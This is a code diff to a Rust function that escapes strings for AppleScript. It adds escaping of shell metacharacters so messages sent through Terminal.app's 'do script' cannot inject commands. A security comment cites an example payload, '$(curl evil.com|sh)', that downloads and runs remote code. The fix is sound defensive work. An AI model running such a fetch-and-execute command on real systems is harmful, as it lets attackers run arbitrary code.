@@ -311,11 +311,17 @@ end tell
 }
 
 /// Escape a string for safe embedding inside an AppleScript double-quoted string.
-/// Replaces straight single quotes with typographic right single quote to avoid shell issues.
+///
+/// SECURITY: Terminal.app's `do script` executes its argument as a shell command.
+/// We must neutralize shell metacharacters to prevent injection. A message like
+/// `$(curl evil.com|sh)` would otherwise execute in every Terminal tab.
 fn escape_applescript(s: &str) -> String {
     s.replace('\\', "\\\\")
         .replace('"', "\\\"")
         .replace('\'', "\u{2019}")
+        .replace('$', "\\$")
+        .replace('`', "\\`")
+        .replace('!', "\\!")
 }
 
 /// Find the tty device for the Terminal tab running claude in a given cwd.
